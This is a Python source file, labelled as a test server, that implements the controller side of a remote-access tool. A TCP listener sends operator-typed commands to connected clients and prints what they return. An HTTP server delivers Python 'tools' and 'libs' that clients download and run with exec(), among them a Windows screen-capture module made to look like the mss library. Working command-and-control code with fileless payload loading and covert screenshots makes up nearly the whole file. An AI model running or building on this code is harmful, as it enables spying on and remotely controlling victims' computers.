import socket
import json
import threading
import base64
import signal
import sys
import os
from datetime import datetime

class TestToolServer:
    def __init__(self):
        # In-memory MSS library implementation
        self.libs = {
            'mss': '''
import ctypes
import sys
import zlib
import struct
from types import SimpleNamespace

# Windows-specific screen capture
if sys.platform == 'win32':
    from ctypes import windll, create_string_buffer, byref, c_void_p, c_int
    from ctypes.wintypes import DWORD, RECT, HWND, HDC, HBITMAP

    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [
            ('biSize', DWORD),
            ('biWidth', c_int),
            ('biHeight', c_int),
            ('biPlanes', ctypes.c_short),
            ('biBitCount', ctypes.c_short),
            ('biCompression', DWORD),
            ('biSizeImage', DWORD),
            ('biXPelsPerMeter', c_int),
            ('biYPelsPerMeter', c_int),
            ('biClrUsed', DWORD),
            ('biClrImportant', DWORD)
        ]

class MSS:
    def __init__(self):
        self.compression_level = 6
        
        if sys.platform == 'win32':
            user32 = windll.user32
            self.monitors = [{
                'left': 0,
                'top': 0,
                'width': user32.GetSystemMetrics(0),
                'height': user32.GetSystemMetrics(1)
            }]
        else:
            # Default for testing on non-Windows
            self.monitors = [{'left': 0, 'top': 0, 'width': 1920, 'height': 1080}]

    def grab(self, monitor):
        if sys.platform == 'win32':
            return self._grab_win32(monitor)
        else:
            return self._grab_test(monitor)

    def _grab_win32(self, monitor):
        width, height = monitor['width'], monitor['height']
        
        # Get handles
        hwnd = windll.user32.GetDesktopWindow()
        wDC = windll.user32.GetWindowDC(hwnd)
        dcObj = windll.gdi32.CreateCompatibleDC(wDC)
        
        # Create bitmap
        bmp = windll.gdi32.CreateCompatibleBitmap(wDC, width, height)
        windll.gdi32.SelectObject(dcObj, bmp)
        
        # Copy screen to bitmap
        windll.gdi32.BitBlt(
            dcObj, 0, 0, width, height,
            wDC, monitor['left'], monitor['top'],
            0x00CC0020  # SRCCOPY
        )
        
        # Prepare bitmap info
        bmi = BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.biWidth = width
        bmi.biHeight = -height  # Negative for top-down
        bmi.biPlanes = 1
        bmi.biBitCount = 24
        bmi.biCompression = 0
        
        # Get raw bytes
        size = height * width * 3
        data = create_string_buffer(size)
        windll.gdi32.GetDIBits(
            dcObj, bmp, 0, height,
            data, byref(bmi), 0  # DIB_RGB_COLORS
        )
        
        # Clean up
        windll.gdi32.DeleteObject(bmp)
        windll.gdi32.DeleteDC(dcObj)
        windll.user32.ReleaseDC(hwnd, wDC)
        
        return SimpleNamespace(rgb=data.raw, size=(width, height))

    def _grab_test(self, monitor):
        # Fallback for non-Windows systems
        width, height = monitor['width'], monitor['height']
        size = width * height * 3
        data = (ctypes.c_ubyte * size)()
        return SimpleNamespace(rgb=bytes(data), size=(width, height))

    def to_png(self, data, size):
        width, height = size
        line = width * 3
        
        # Add PNG filter byte (0) to each line
        png_data = bytearray()
        for y in range(height):
            png_data.append(0)  # Filter type 0 (None)
            png_data.extend(data[y*line:(y+1)*line])
        
        # Create PNG chunks
        header = struct.pack('!2I5B', width, height, 8, 2, 0, 0, 0)
        ihdr = self._create_chunk(b'IHDR', header)
        idat = self._create_chunk(b'IDAT', zlib.compress(png_data, self.compression_level))
        iend = self._create_chunk(b'IEND', b'')
        
        return b'\\x89PNG\\r\\n\\x1a\\n' + ihdr + idat + iend

    def _create_chunk(self, type_code, data):
        chunk = type_code + data
        return struct.pack('!I', len(data)) + chunk + struct.pack('!I', zlib.crc32(chunk))

    def __enter__(self): return self
    def __exit__(self, *args): pass

def mss(): return MSS()
'''
        }

        # Screenshot tool implementation
        self.tools = {
            'screenshot': '''
import sys
import importlib.util
import requests
import base64
import os
from datetime import datetime

def load_lib_from_server(lib_name):
    try:
        response = requests.get(f"http://127.0.0.1:8000/libs/{lib_name}.py")
        if response.status_code == 200:
            spec = importlib.util.spec_from_loader(lib_name, loader=None)
            module = importlib.util.module_from_spec(spec)
            sys.modules[lib_name] = module
            exec(response.text, module.__dict__)
            return module
    except Exception as e:
        print(f"Failed to load {lib_name}: {e}")
    return None

def capture():
    try:
        mss = load_lib_from_server('mss')
        if not mss:
            return "Failed to load mss library"
            
        # Create screenshots directory if it doesn't exist
        os.makedirs('screenshots', exist_ok=True)
            
        with mss.mss() as sct:
            monitor = sct.monitors[0]
            screenshot = sct.grab(monitor)
            png_bytes = sct.to_png(screenshot.rgb, screenshot.size)
            
            # Generate filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            filename = os.path.join('screenshots', f'screenshot-{timestamp}.png')
            
            # Save the PNG file
            with open(filename, 'wb') as f:
                f.write(png_bytes)
            
            return f"Screenshot saved as {filename}"
            
    except Exception as e:
        import traceback
        return f"Screenshot failed: {str(e)}\\n{traceback.format_exc()}"
'''
        }

    def get_tool(self, tool_name):
        return self.tools.get(tool_name)

    def get_lib(self, lib_name):
        return self.libs.get(lib_name)

class TestServer:
    def __init__(self, host='127.0.0.1', port=5555):
        self.host = host
        self.port = port
        self.tool_server = TestToolServer()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = True
        self.clients = []
        signal.signal(signal.SIGINT, self.handle_shutdown)

    def handle_shutdown(self, signum, frame):
        print("\n[!] Shutting down server...")
        self.running = False
        for client in self.clients:
            try:
                client.send(json.dumps("quit").encode())
                client.close()
            except: pass
        self.sock.close()
        sys.exit(0)

    def handle_client(self, client_socket, addr):
        self.clients.append(client_socket)
        print(f"[+] Client {addr} connected")
        
        while self.running:
            try:
                command = input(f"[{addr[0]}:{addr[1]}]> ")
                if not command: continue
                
                client_socket.send(json.dumps(command).encode())
                client_socket.settimeout(5)
                response = client_socket.recv(4096).decode()
                
                try:
                    response = json.loads(response)
                    print(f"\nResponse from {addr[0]}:{addr[1]}:")
                    print("-" * 50)
                    print(response)
                    print("-" * 50)
                except:
                    print(f"Raw response: {response}")
                
                if command == 'quit': break
                    
            except socket.timeout:
                print("[!] Response timeout")
            except Exception as e:
                print(f"[!] Error: {e}")
                break
        
        self.clients.remove(client_socket)
        client_socket.close()
        print(f"[!] Client {addr} disconnected")

    def start(self):
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        print(f"[+] Server listening on {self.host}:{self.port}")
        
        while self.running:
            try:
                self.sock.settimeout(1)
                client, addr = self.sock.accept()
                client_thread = threading.Thread(target=self.handle_client, args=(client, addr))
                client_thread.daemon = True
                client_thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[!] Error accepting connection: {e}")

if __name__ == "__main__":
    try:
        import http.server
        import socketserver

        class ToolRequestHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args): pass
                
            def do_GET(self):
                if self.path.startswith('/tools/'):
                    tool_name = self.path.split('/')[-1].replace('.py', '')
                    tool_code = TestToolServer().get_tool(tool_name)
                    if tool_code:
                        self.send_response(200)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(tool_code.encode())
                    else:
                        self.send_response(404)
                        self.end_headers()
                elif self.path.startswith('/libs/'):
                    lib_name = self.path.split('/')[-1].replace('.py', '')
                    lib_code = TestToolServer().get_lib(lib_name)
                    if lib_code:
                        self.send_response(200)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(lib_code.encode())
                    else:
                        self.send_response(404)
                        self.end_headers()

        http_server = socketserver.TCPServer(('127.0.0.1', 8000), ToolRequestHandler)
        http_thread = threading.Thread(target=http_server.serve_forever)
        http_thread.daemon = True
        http_thread.start()
        print("[+] Tool server started on port 8000")

        server = TestServer()
        server.start()
        
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
    finally:
        try:
            http_server.shutdown()
            http_server.server_close()
        except: pass 